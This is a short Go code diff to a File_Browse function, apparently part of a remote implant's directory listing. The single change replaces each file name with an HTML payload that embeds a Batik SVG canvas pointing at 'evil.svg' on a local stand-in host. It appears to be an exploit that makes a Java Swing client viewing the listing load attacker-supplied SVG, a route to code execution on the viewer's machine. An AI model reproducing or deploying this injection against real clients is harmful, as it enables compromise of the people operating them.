@@ -201,7 +201,7 @@ func File_Browse(b []byte) []byte {
 		if file.IsDir() {
 			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
 		} else {
-			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
+			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, "<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='http://127.0.0.1:8080/evil.svg'>")
 		}
 	}
 	//fmt.Println(resultStr)
